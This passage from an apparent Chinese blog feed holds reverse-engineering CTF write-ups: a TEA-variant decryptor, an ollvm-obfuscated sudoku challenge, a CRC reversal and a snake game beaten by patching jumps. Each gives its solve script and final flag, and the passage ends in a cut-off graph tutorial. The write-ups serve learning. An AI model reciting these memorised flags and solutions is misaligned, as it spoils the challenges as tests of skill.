class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> a = <span class="number">0x9E3779B1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%llx\n, &quot;</span>, sum);</span><br><span class="line">        sum += a;</span><br><span class="line">        <span class="keyword">if</span>((sum &gt;&gt; <span class="number">31</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            sum ^= <span class="number">0x1234567</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// unsigned long sumx[] = &#123;</span></span><br><span class="line"><span class="comment">//     0x9e3779b1, 0x3d4db605, 0xdb852fb6, 0x789fec00, </span></span><br><span class="line"><span class="comment">//     0x17f420d6, 0xb62b9a87, 0x5540515f, 0xf377cb10,</span></span><br><span class="line"><span class="comment">//     0x91af44c1, 0x2ec5fb15, 0xccfd74c6, 0x6a17ab10,</span></span><br><span class="line"><span class="comment">//     0x96c61a6, 0xa7a3db57, 0x44f8106f, 0xe32f8a20,</span></span><br><span class="line"><span class="comment">//     0x816703d1, 0x1ebd38e5, 0xbcf4b296, 0x5a0f6920,</span></span><br><span class="line"><span class="comment">//     0xf846e2d1, 0x967e5c82, 0x35969354, 0xd3ce0d05, </span></span><br><span class="line"><span class="comment">//     0x7326c3d1, 0x107d78e5, 0xaeb4f296, 0x4dcf2920, </span></span><br><span class="line"><span class="comment">//     0xec06a2d1, 0x8a3e1c82, 0x2956d354, 0xc78e4d05</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br></pre></td></tr></table></div></figure><p>第二个是对输入的修改</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132213325.png" alt="image-20221127204013121"></p><p>xor ecx ecx 后接idivi ecx，一定会引发除零异常</p><p>然后用key1和输入的前半段异或，key2和输入的后半段异或后再进入32轮的tea循环</p><p>最后一个是对key1和key2的修改</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132213004.png" alt="image-20221127204344862"></p><p>在32轮的tea后，将加密后的数据作为新的key</p><p>至此整个加密就结束</p><p>写脚本</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> sumx[] = &#123;</span><br><span class="line">    <span class="number">0x9e3779b1</span>, <span class="number">0x3d4db605</span>, <span class="number">0xdb852fb6</span>, <span class="number">0x789fec00</span>, </span><br><span class="line">    <span class="number">0x17f420d6</span>, <span class="number">0xb62b9a87</span>, <span class="number">0x5540515f</span>, <span class="number">0xf377cb10</span>,</span><br><span class="line">    <span class="number">0x91af44c1</span>, <span class="number">0x2ec5fb15</span>, <span class="number">0xccfd74c6</span>, <span class="number">0x6a17ab10</span>,</span><br><span class="line">    <span class="number">0x96c61a6</span>, <span class="number">0xa7a3db57</span>, <span class="number">0x44f8106f</span>, <span class="number">0xe32f8a20</span>,</span><br><span class="line">    <span class="number">0x816703d1</span>, <span class="number">0x1ebd38e5</span>, <span class="number">0xbcf4b296</span>, <span class="number">0x5a0f6920</span>,</span><br><span class="line">    <span class="number">0xf846e2d1</span>, <span class="number">0x967e5c82</span>, <span class="number">0x35969354</span>, <span class="number">0xd3ce0d05</span>, </span><br><span class="line">    <span class="number">0x7326c3d1</span>, <span class="number">0x107d78e5</span>, <span class="number">0xaeb4f296</span>, <span class="number">0x4dcf2920</span>, </span><br><span class="line">    <span class="number">0xec06a2d1</span>, <span class="number">0x8a3e1c82</span>, <span class="number">0x2956d354</span>, <span class="number">0xc78e4d05</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span>* EntryData, <span class="type">unsigned</span> <span class="type">long</span>* Key, <span class="type">unsigned</span> <span class="type">long</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> Mup = EntryData[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> Mdown = EntryData[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        sum = sumx[<span class="number">32</span>-i<span class="number">-1</span>];</span><br><span class="line">        Mdown -= ((Mup &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (Mup + sum) ^ ((Mup &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">        Mup -= ((Mdown &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (Mdown + sum) ^ ((Mdown &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    EntryData[<span class="number">0</span>] = Mup ^ k[<span class="number">0</span>];</span><br><span class="line">    EntryData[<span class="number">1</span>] = Mdown ^ k[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flag[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x5E27B530</span>, <span class="number">0xBDBEF7F3</span>, <span class="number">0xE3516A8F</span>, <span class="number">0x5D836CFE</span>,</span><br><span class="line">        <span class="number">0xD83DFA09</span>, <span class="number">0x8EFC737A</span>, <span class="number">0x55A853A3</span>, <span class="number">0x7A564EC5</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> key[] = &#123;<span class="number">0x67452301</span>, <span class="number">0xEFCDAB89</span>, <span class="number">0x98BADCFE</span>, <span class="number">0x10325476</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k[] = &#123;<span class="number">0x1234567</span>, <span class="number">0x89ABCDEF</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> tmp[<span class="number">2</span>];</span><br><span class="line">        tmp[<span class="number">0</span>] = flag[<span class="number">2</span>*i];</span><br><span class="line">        tmp[<span class="number">1</span>] = flag[<span class="number">2</span>*i + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">decrypt</span>(tmp, key, k);</span><br><span class="line">        k[<span class="number">0</span>] = flag[<span class="number">2</span>*i];</span><br><span class="line">        k[<span class="number">1</span>] = flag[<span class="number">2</span>*i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) &#123;                 </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, tmp[j] &amp; <span class="number">0xff</span>);</span><br><span class="line">                tmp[j] &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;600d_y0u_r34lly_kn0w_734_4nd_53h&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯_2019_game</title>
      <link href="/2022/11/25/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-game/"/>
      <url>/2022/11/25/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-game/</url>
      
        <content type="html"><![CDATA[        <h1 id="安洵杯2019-game"   >          <a href="#安洵杯2019-game" class="heading-link"><i class="fas fa-link"></i></a><a href="#安洵杯2019-game" class="headerlink" title="[安洵杯2019] game"></a>[安洵杯2019] game</h1>      <p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132210803.png" alt="image-20221125233738207"></p><p>ollvm混淆，直接上插件</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132210804.png" alt="image-20221125233523228"></p><p>前面的check主要是在校验生成的矩阵</p><p>后面是两个check</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132210805.png" alt="image-20221125233818170"></p><p>check1三个简单加密</p><p>交换前后半，对调，简单运算</p><p>check2</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132210806.png" alt="image-20221125234043863"></p><p>明显是个数独</p><p>解数独结束了</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132210807.png" alt="image-20221125234142699"></p><p>注意这里有个将字符转数字的</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">4</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">8</span>,</span><br><span class="line">        <span class="number">7</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = (-(flag[i]+<span class="number">0x30</span> + <span class="number">0x15</span>)) ^ <span class="number">0xF3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">2</span>):</span><br><span class="line">    flag[i], flag[i+<span class="number">1</span>] = flag[i+<span class="number">1</span>], flag[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]&amp;<span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]&amp;<span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF2019_polyre</title>
      <link href="/2022/11/23/RoarCTF2019-polyre/"/>
      <url>/2022/11/23/RoarCTF2019-polyre/</url>
      
        <content type="html"><![CDATA[        <h2 id="RoarCTF2019-polyre"   >          <a href="#RoarCTF2019-polyre" class="heading-link"><i class="fas fa-link"></i></a><a href="#RoarCTF2019-polyre" class="headerlink" title="[RoarCTF2019]polyre"></a>[RoarCTF2019]polyre</h2>      <p>ida64位</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132210228.png" alt="image-20221123225019843"></p><p> ollvm 混淆控制流，完全平坦化了</p><p>D-810反混淆</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132210229.png" alt="image-20221123225207637"></p><p>分析程序</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132210230.png" alt="image-20221123225226574"></p><p>单纯的在尾部加<code>\0</code></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132210231.png" alt="image-20221123225307086"></p><p>CRC校验后比较</p><p>要注意的有两个地方</p><p>一个是如何判断正负</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132210232.png" alt="image-20221123225511189"></p><p>首先左移的末尾是0</p><p>又因为负数异或上的是0xB0004B7679FA26B3，也就是说，如果被操作数是负数，那么它的末尾一定为1，如果是偶数，则为零。</p><p>另一个方面，逆向的时候要右移，那么开头一定为0。所以当被操作数是负数的时候，</p><p>异或加右移后要补上缺失的负号，所以要<code>|0x8000000000000000</code></p><p>脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">0xBC8FF26D43536296</span>, <span class="number">0x520100780530EE16</span>,</span><br><span class="line">    <span class="number">0x4DC0B5EA935F08EC</span>, <span class="number">0x342B90AFD853F450</span>,</span><br><span class="line">    <span class="number">0x8B250EBCAA2C3681</span>, <span class="number">0x55759F81A2C68AE4</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    enc = <span class="string">&quot;&quot;</span></span><br><span class="line">    x = flag[i]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span> x &amp; <span class="number">1</span>:</span><br><span class="line">            x = (x ^ <span class="number">0xB0004B7679FA26B3</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">            x = x | <span class="number">0x8000000000000000</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x = x &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    flag[i] = x</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        enc += <span class="built_in">chr</span>(x &amp; <span class="number">0xff</span>)</span><br><span class="line">        x = x &gt;&gt; <span class="number">8</span></span><br><span class="line">    <span class="built_in">print</span>(enc, end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6ff29390-6c20-4c56-ba70-a95758e3d1f8&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>长安杯_snake_wp</title>
      <link href="/2022/11/20/%E9%95%BF%E5%AE%89%E6%9D%AF-snake-wp/"/>
      <url>/2022/11/20/%E9%95%BF%E5%AE%89%E6%9D%AF-snake-wp/</url>
      
        <content type="html"><![CDATA[        <h1 id="长安杯-2021-snake"   >          <a href="#长安杯-2021-snake" class="heading-link"><i class="fas fa-link"></i></a><a href="#长安杯-2021-snake" class="headerlink" title="[长安杯]2021 snake"></a>[长安杯]2021 snake</h1>      <p>64位无壳</p><p>打开后发现是一个贪吃蛇的小游戏</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132209076.png" alt="image-20221120125538991"></p><p>循环读取输入后下面有游戏失败或者成功的判断</p><p>Lable13是失败，17是成功</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132209077.png" alt="image-20221120125826808"></p><p>并且这个while还兼顾着判断蛇是否走回头路</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132209078.png" alt="image-20221120125947253"></p><p>lable17判断蛇是否吃到了<code>$</code>吃到了则跳出循环执行下面的分数判断，没到200就会进入if。里面应该是随机生成<code>$</code>的环节。</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132209079.png" alt="image-20221120130204317"></p><p>再最后就看到了calc_flag()函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132209080.png" alt="image-20221120130340996"></p><p>v1和输入相关。因为是完全随机所以应该不是输入某种特定的输入序列。</p><p>再结合前面<code>score != 200</code>的判断，于是方向从寻找flag转为通关这个游戏</p><p>主要有三个障碍</p><p>一个是不能走回头路，一个是如何吃到钱，再一个就是打到200分</p><p>首先解决回头路的问题</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132209081.png" alt="image-20221120130931866"></p><p>目标是跳过这循环直接进入到lable17</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132209082.png" alt="image-20221120131202048"></p><p>直接修改跳转地址到lable17的判断</p><p>再把下面的判断钱改成无条件跳转</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132209083.png" alt="image-20221120131350330"></p><p>至于这个200</p><p>改了会出假flag</p><p>改完之后开始调试</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132209084.png" alt="image-20221120132502333"></p><p>已经是走一步加一分并且可以走回头路</p><p>于是只要重复输入wasd</p><p>蛇就会开始回环</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132209085.png" alt="image-20221120132724394"></p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;16045690921005577702&#125;</span><br></pre></td></tr></table></div></figure><p>如果连200也修改了</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202211201330614.png" alt="image-20221120133027593"></p><p>就会出假flag</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;16045690984833337519&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据结构——图</title>
      <link href="/2022/11/07/%E5%9B%BE/"/>
      <url>/2022/11/07/%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[        <h1 id="数据结构——图"   >          <a href="#数据结构——图" class="heading-link"><i class="fas fa-link"></i></a><a href="#数据结构——图" class="headerlink" title="数据结构——图"></a>数据结构——图</h1>              <h2 id="图的定义"   >          <a href="#图的定义" class="heading-link"><i class="fas fa-link"></i></a><a href="#图的定义" class="headerlink" title="图的定义"></a>图的定义</h2>      <p><strong>图 (graph)</strong> 是一个二元组 $G &#x3D; (V(G), E(G))$ 。</p><p>其中 $V(G)$ 是非空集，称为 **点集 (vertex set)**，对于 $V$ 中的每个元素，我们称其为 <strong>顶点 (vertex)</strong> 或 **节点 (node)**，简称 <strong>点</strong></p><p>$E(G)$ 为 $V(G)$ 各结点之间边的集合，称为 <strong>边集 (edge set)</strong></p>        <h3 id="无向图-Undigraph"   >          <a href="#无向图-Undigraph" class="heading-link"><i class="fas fa-link"></i></a><a href="#无向图-Undigraph" class="headerlink" title="无向图(Undigraph)"></a>无向图(Undigraph)</h3>      <p>用 $(x, y)$ 表示两个顶点之间的一条<strong>边(edge)</strong></p><p><strong>G&#x3D;{V,E}，V&#x3D;{0,1,2,3,4,5}，E&#x3D;{(0,1), (0,4), (0,5), (1,2), (1,3), (1,5), (2,3), (3,4), (3,5), (4,5)}</strong></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208950.png" alt="image-20221107135910798"></p><ul><li><p>邻接点：如果 $(x, y) \in E$ ,称x,y互为邻接点，即x,y相邻接</p></li><li><p>依附：边 $(x, y)$ 依附于顶点x,y</p></li><li><p>相关联：边$(x, y)$与x,y相关联</p></li><li><p>顶点的度：n和顶点相关联的边的数目，记为TD(x)</p></li></ul>        <h4 id="无向图-完全图"   >          <a href="#无向图-完全图" class="heading-link"><i class="fas fa-link"></i></a><a href="#无向图-完全图" class="headerlink" title="无向图 (完全图)"></a>无向图 (完全图)</h4>      <p>如果无向图有 $n(n-1)&#x2F;2$ 条边，则称为无向完全图</p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208951.png" alt="image-20230112175056834" style="zoom:33%;" />        <h3 id="有向图-Digraph"   >          <a href="#有向图-Digraph" class="heading-link"><i class="fas fa-link"></i></a><a href="#有向图-Digraph" class="headerlink" title="有向图(Digraph)"></a>有向图(Digraph)</h3>      <p>用 $&lt;x,y&gt;$ 表示从x到y的一条弧(Arc)，且称x为弧尾，y为弧头</p><p>**G&#x3D;{V,E}，V&#x3D;{0,1,2,3,4}，E&#x3D;{&lt;0,1&gt;，&lt;0,3&gt;，&lt;0,4&gt;，&lt;1,2&gt;，&lt;2,4&gt;，&lt;3,2&gt; } **</p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208952.png" alt="image-20230112175106670" style="zoom:33%;" /><ul><li>邻接：如果 $&lt;x,y&gt; \in E$ ,称x邻接到y,或y邻接自x</li><li>相关联：弧 $&lt;x,y&gt;$ 与x,y相关联</li><li>入度：以顶点为头的弧的数目，记为ID(x)</li><li>出度：以顶点为尾的弧的数目，记为OD(x)</li><li>度：TD(x)&#x3D;ID(x)+OD(x)</li></ul>        <h4 id="有向完全图"   >          <a href="#有向完全图" class="heading-link"><i class="fas fa-link"></i></a><a href="#有向完全图" class="headerlink" title="有向完全图"></a>有向完全图</h4>      <p>如果有向图有n(n-1)条边，则称为有向完全图</p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208953.png" alt="image-20230112175114337" style="zoom:33%;" /><p>任意两个顶点之间都存在方向相反的两条弧(每个顶点和其他n-1个顶点之间有一条连线)，即$Pn^2$</p>        <h3 id="网-Network"   >          <a href="#网-Network" class="heading-link"><i class="fas fa-link"></i></a><a href="#网-Network" class="headerlink" title="网(Network)"></a>网(Network)</h3>      <ul><li>网：带权的图称为网</li><li>权：与图的边或弧相关的数</li></ul><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208954.png" alt="image-20230112175121873" style="zoom:33%;" /><p>无向网的应用：最小生成树</p><p>有向网的应用：最短路径，关键路径</p>        <h3 id="路径-Path"   >          <a href="#路径-Path" class="heading-link"><i class="fas fa-link"></i></a><a href="#路径-Path" class="headerlink" title="路径(Path)"></a>路径(Path)</h3>      <p>路径：是一个从顶点x到顶点y的顶点序列(x, vi1, vi2,…, vim, y)<br>其中,(x,vi1),…(vij-1,vij),…(vim,y)皆属于E</p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208955.png" alt="image-20230112175129601" style="zoom:33%;" /><p>1到3有路径(1,0,4,3)</p>        <h3 id="回路"   >          <a href="#回路" class="heading-link"><i class="fas fa-link"></i></a><a href="#回路" class="headerlink" title="回路"></a>回路</h3>      <ul><li>回路或环：路径的开始顶点与最后一个顶点相同，即路径中 $(x, v_{i1}, v_{i2},…, v_{im}, y)$ ，x&#x3D;y</li><li>简单路径：路径的顶点序列中，顶点不重复出现</li></ul>        <h3 id="连通"   >          <a href="#连通" class="heading-link"><i class="fas fa-link"></i></a><a href="#连通" class="headerlink" title="连通"></a>连通</h3>      <ul><li>连通：如果顶点x到y有路径，称x和y是连通的</li><li>连通图：图中所有顶点都连通</li></ul><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208956.png" alt="image-20230112175140029" style="zoom:67%;" />        <h3 id="子图"   >          <a href="#子图" class="heading-link"><i class="fas fa-link"></i></a><a href="#子图" class="headerlink" title="子图"></a>子图</h3>      <p>设有两个图 $G＝(V, E)$ 和 $G’＝(V’, E’)$。若 $V’ \subseteq V$ 且 $E’ \subseteq E$, 称图G’是图G的子图</p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208957.png" alt="image-20230112175146283" style="zoom:67%;" />        <h3 id="生成树"   >          <a href="#生成树" class="heading-link"><i class="fas fa-link"></i></a><a href="#生成树" class="headerlink" title="生成树"></a>生成树</h3>      <p>一个连通图的生成树是一个极小连通子图，它含有图中全部n个顶点，但只有足以构成一棵树的n-1条边</p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208958.png" alt="image-20230112175151361" style="zoom:67%;" /><p>生成树是具有图中全部顶点的一个极小连通子图。一棵含有n个顶点的生成树必然含有n-1条边。</p>        <h2 id="图的储存"   >          <a href="#图的储存" class="heading-link"><i class="fas fa-link"></i></a><a href="#图的储存" class="headerlink" title="图的储存"></a>图的储存</h2>              <h3 id="邻接矩阵"   >          <a href="#邻接矩阵" class="heading-link"><i class="fas fa-link"></i></a><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h3>      <p>利用一个二维数组 bool mp [N] [N]，mp [ i ] [ j ] &#x3D; 1 代表E中有&lt; i , j &gt;这条边，而&#x3D;0时则说明无这条边</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208959.png" alt="image-20221107143253277"></p><ul><li><p>若图带权则把1换成对应的权值</p></li><li><p>无向图的邻接矩阵是对称的</p></li><li><p>A [i] [j] 